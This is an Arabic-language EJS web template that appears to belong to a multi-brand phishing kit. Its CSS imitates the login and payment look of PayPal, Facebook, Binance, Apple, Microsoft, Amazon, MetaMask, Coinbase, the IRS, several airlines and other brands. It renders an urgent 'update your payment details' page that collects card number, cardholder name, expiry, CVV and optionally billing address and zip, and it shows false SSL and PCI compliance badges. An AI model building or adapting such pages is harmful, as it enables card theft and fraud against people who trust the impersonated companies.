<!doctype html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title><%= pageContent.page_title %> — <%= tpl.name %></title>
<style>
:root{--bg:<%= tpl.palette.bg %>;--card:<%= tpl.palette.card %>;--fg:<%= tpl.palette.fg %>;--ac:<%= tpl.palette.accent %>;--ac2:<%= tpl.palette.accent2 %>}
*{box-sizing:border-box;margin:0;padding:0}
body{background:var(--bg);color:var(--fg);font-family:system-ui,-apple-system,Tahoma,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:var(--card);border-radius:16px;padding:36px 32px;max-width:460px;width:100%;box-shadow:0 8px 32px #00000040}
.brand-logo{font-size:1.1rem;font-weight:700;color:var(--ac);margin-bottom:8px;display:block;text-align:center}
body.brand-paypal{background:#0070ba}
body.brand-paypal .card{background:#fff;color:#2c2e2f;border-radius:6px;border:none;box-shadow:0 0 0 1px #b7bcbf}
body.brand-paypal .btn{background:#0070ba;border-radius:25px;background-image:none}
body.brand-facebook{background:#f0f2f5;color:#1c1e21}
body.brand-facebook .card{background:#fff;box-shadow:0 2px 4px rgba(0,0,0,.1)}
body.brand-facebook .btn{background:#1877F2;background-image:none}
body.brand-binance{background:#181A20;color:#eaecef}
body.brand-binance .card{background:#1e2026;border:1px solid #2e3340}
body.brand-binance input{background:#2b2f36;border:1px solid #474d57;color:#eaecef}
body.brand-binance .btn{background:#F0B90B;color:#1a1a1a}
body.brand-apple{background:#f5f5f7;color:#1d1d1f}
body.brand-apple .card{background:#fff;border-radius:18px;box-shadow:0 4px 16px rgba(0,0,0,.12)}
body.brand-apple input{background:#f5f5f7;border:1px solid #d2d2d7;color:#1d1d1f}
body.brand-apple .btn{background:#0071e3;background-image:none;border-radius:980px}
body.brand-microsoft{background:#fff;color:#323130}
body.brand-microsoft .card{background:#fff;border-radius:0;box-shadow:none}
body.brand-microsoft input{background:#fff;border:1px solid #605e5c;color:#323130}
body.brand-microsoft .btn{background:#0067b8;background-image:none;border-radius:2px}
body.brand-amazon{background:#fff;color:#0f1111}
body.brand-amazon .card{background:#fff;border:1px solid #a6a6a6;border-radius:4px;box-shadow:none}
body.brand-amazon input{background:#fff;border:1px solid #a6a6a6;color:#0f1111}
body.brand-amazon .btn{background:linear-gradient(to bottom,#f7dfa5,#f0c14b);color:#111;border:1px solid #a88734;background-image:none}
body.brand-netflix{background:#000;color:#fff}
body.brand-netflix .card{background:#141414;border-radius:4px}
body.brand-netflix input{background:#333;border:none;color:#fff}
body.brand-netflix .btn{background:#e50914;background-image:none;border-radius:4px}
body.brand-instagram{background:#fafafa;color:#262626}
body.brand-instagram .card{background:#fff;border:1px solid #dbdbdb;border-radius:1px;box-shadow:none}
body.brand-instagram input{background:#fafafa;border:1px solid #dbdbdb;color:#262626}
body.brand-instagram .btn{background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);background-image:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888)}
body.brand-twitter,body.brand-twitterx{background:#fff;color:#0f1419}
body.brand-twitter .card,body.brand-twitterx .card{background:#fff;border-radius:16px;box-shadow:none}
body.brand-twitter input,body.brand-twitterx input{background:#fff;border:1px solid #cfd9de;color:#0f1419}
body.brand-twitter .btn,body.brand-twitterx .btn{background:#0f1419;background-image:none;border-radius:9999px}
body.brand-metamask{background:#24272A;color:#fff}
body.brand-metamask .card{background:#1c1f22;border:1px solid #3c4044}
body.brand-metamask input{background:#2b2f36;border:1px solid #474d57;color:#fff}
body.brand-metamask .btn{background:#F6851B;background-image:none;border-radius:8px}
body.brand-google,body.brand-gmail{background:#fff;color:#202124}
body.brand-google .card,body.brand-gmail .card{background:#fff;border:1px solid #dadce0;box-shadow:none}
body.brand-google input,body.brand-gmail input{background:#fff;border:1px solid #dadce0;color:#202124}
body.brand-google .btn,body.brand-gmail .btn{background:#1a73e8;background-image:none;border-radius:4px}
body.brand-coinbase{background:#fff;color:#0a0b0d}
body.brand-coinbase .card{background:#fff;border:1px solid #e9eaeb;border-radius:16px}
body.brand-coinbase input{background:#f5f5f5;border:1px solid #e9eaeb;color:#0a0b0d}
body.brand-coinbase .btn{background:#0052FF;background-image:none;border-radius:8px}
body.brand-discord{background:#5865F2}
body.brand-discord .card{background:#36393f;border-radius:5px}
body.brand-discord input{background:#40444b;border:none;color:#dcddde}
body.brand-discord .btn{background:#5865F2;background-image:none;border-radius:3px}
body.brand-linkedin{background:#f3f2ef;color:#000}
body.brand-linkedin .card{background:#fff;border-radius:8px;box-shadow:0 0 0 1px rgba(0,0,0,.15)}
body.brand-linkedin input{background:#fff;border:1px solid rgba(0,0,0,.4);color:#000}
body.brand-linkedin .btn{background:#0a66c2;background-image:none;border-radius:28px}
body.brand-snapchat{background:#FFFC00;color:#000}
body.brand-snapchat .card{background:#fff;border-radius:32px;box-shadow:0 4px 20px rgba(0,0,0,.15)}
body.brand-snapchat input{background:#f5f5f5;border:1.5px solid #e0e0e0;color:#000}
body.brand-snapchat .btn{background:#FFFC00;color:#000;background-image:none;border-radius:100px}
body.brand-tiktok{background:#000;color:#fff}
body.brand-tiktok .card{background:#161823;border:1px solid #2e3340;border-radius:0}
body.brand-tiktok input{background:#2b2f36;border:1px solid #3c4044;color:#fff}
body.brand-tiktok .btn{background:#fe2c55;background-image:none;border-radius:2px}
body.brand-spotify{background:#191414;color:#fff}
body.brand-spotify .card{background:#191414;box-shadow:none}
body.brand-spotify input{background:#3e3e3e;border:none;color:#fff}
body.brand-spotify .btn{background:#1DB954;color:#000;background-image:none;border-radius:50px}
body.brand-irs{background:#f5f5f5;color:#1a1a1a;font-family:'Times New Roman',serif}
body.brand-irs .card{background:#fff;border:1px solid #ccc;border-radius:4px}
body.brand-irs input{background:#fff;border:1px solid #aaa;color:#1a1a1a}
body.brand-irs .btn{background:#003366;background-image:none;border-radius:3px}
body.brand-emirates{background:#C8102E}
body.brand-emirates .card{background:#fff;color:#1a1a1a;border-radius:6px}
body.brand-emirates input{background:#f7f7f7;border:1px solid #ddd;color:#1a1a1a}
body.brand-emirates .btn{background:#C8102E;background-image:none;border-radius:4px}
body.brand-qatarairways{background:#5C0632}
body.brand-qatarairways .card{background:#fff;color:#1a1a1a;border-radius:6px}
body.brand-qatarairways input{background:#f7f7f7;border:1px solid #ddd;color:#1a1a1a}
body.brand-qatarairways .btn{background:#5C0632;background-image:none;border-radius:4px}
body.brand-steam{background:#1b2838;color:#c6d4df}
body.brand-steam .card{background:#1e2b38;border-radius:3px}
body.brand-steam input{background:#316282;border:none;color:#fff}
body.brand-steam .btn{background:linear-gradient(to bottom,#a4d007,#536904);color:#fff;background-image:none;border-radius:3px}
.warn-banner{background:#f59e0b18;border:1px solid #f59e0b40;border-radius:10px;padding:12px 16px;margin-bottom:24px;font-size:.87rem;color:#fcd34d;text-align:center}
h1{font-size:1.2rem;margin-bottom:6px;text-align:center}
.sub{font-size:.88rem;opacity:.6;text-align:center;margin-bottom:24px}
.card-visual{background:linear-gradient(135deg,var(--ac),var(--ac2));border-radius:14px;padding:20px 22px;margin-bottom:24px;position:relative;min-height:90px}
.card-visual .chip{width:32px;height:24px;background:#ffd700;border-radius:4px;opacity:.8;margin-bottom:12px}
.card-visual .num{font-size:1.1rem;letter-spacing:3px;color:#fff;font-family:monospace;opacity:.7}
.field-group{margin-bottom:14px}
label{display:block;font-size:.83rem;opacity:.75;margin-bottom:5px}
input{width:100%;padding:12px 14px;background:var(--bg);border:1.5px solid #ffffff18;border-radius:10px;color:var(--fg);font-family:monospace;font-size:1rem;transition:.2s;outline:none;letter-spacing:1px}
input:focus{border-color:var(--ac);box-shadow:0 0 0 3px var(--ac)20}
.row2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
.btn{width:100%;padding:14px;background:var(--ac);color:#fff;border:0;border-radius:10px;font-size:1rem;font-weight:600;cursor:pointer;margin-top:12px;transition:.2s}
.btn:hover{opacity:.9}
.secure{text-align:center;font-size:.76rem;opacity:.4;margin-top:14px;display:flex;align-items:center;justify-content:center;gap:6px}
.card-icons{display:flex;gap:8px;justify-content:flex-end;margin-bottom:16px;opacity:.5;font-size:.78rem}
</style>
</head>
<body class="brand-<%= tpl.key || tpl.name.toLowerCase().replace(/[^a-z0-9]/g,'') %>">
<div class="card">
  <% if (typeof logos !== 'undefined' && logos[tpl.key]) { %><div style="text-align:center;margin-bottom:12px"><%- logos[tpl.key] %></div><% } else { %><span class="brand-logo"><%= tpl.name %></span><% } %>

  <div class="warn-banner">
    ⚠️ <%= pageContent.subheadline || 'يجب تحديث بيانات الدفع للمتابعة' %>
  </div>

  <h1><%= pageContent.headline || 'تحديث طريقة الدفع' %></h1>
  <p class="sub">أدخل بيانات بطاقتك بشكل آمن</p>

  <div class="card-icons">
    <span>VISA</span><span>Mastercard</span><span>AMEX</span>
  </div>

  <form method="POST" action="/p/<%= page.slug %>/step/<%= pageContent.slug %>">
    <input type="hidden" name="_csrf" value="<%= csrfToken %>">
    <input type="hidden" name="_step" value="<%= pageContent.slug %>">

    <div class="field-group">
      <label>رقم البطاقة</label>
      <input type="text" name="card_number" maxlength="19" placeholder="0000  0000  0000  0000"
             oninput="this.value=this.value.replace(/\D/g,'').replace(/(.{4})/g,'$1 ').trim()" required>
    </div>
    <div class="field-group">
      <label>الاسم على البطاقة</label>
      <input type="text" name="name_on_card" placeholder="JOHN DOE" style="font-family:inherit;letter-spacing:0" required>
    </div>
    <div class="row2">
      <div class="field-group">
        <label>تاريخ الانتهاء</label>
        <input type="text" name="expiry" maxlength="5" placeholder="MM/YY"
               oninput="let v=this.value.replace(/\D/g,'');if(v.length>=2)v=v.slice(0,2)+'/'+v.slice(2);this.value=v" required>
      </div>
      <div class="field-group">
        <label>CVV</label>
        <input type="text" name="cvv" maxlength="4" placeholder="•••" oninput="this.value=this.value.replace(/\D/g,'')" required>
      </div>
    </div>

    <% if ((pageContent.fields||[]).includes('billing_address')) { %>
    <div class="field-group">
      <label>عنوان الفاتورة</label>
      <input type="text" name="billing_address" placeholder="123 Main St" style="font-family:inherit;letter-spacing:0" required>
    </div>
    <% } %>
    <% if ((pageContent.fields||[]).includes('zip')) { %>
    <div class="field-group">
      <label>الرمز البريدي</label>
      <input type="text" name="zip" placeholder="12345" maxlength="10" required>
    </div>
    <% } %>

    <button type="submit" class="btn"><%= pageContent.cta || 'تأكيد وتحديث' %></button>
  </form>
  <p class="secure">🔒 مشفر بـ SSL 256-bit · PCI DSS متوافق</p>
</div>
</body>
</html>
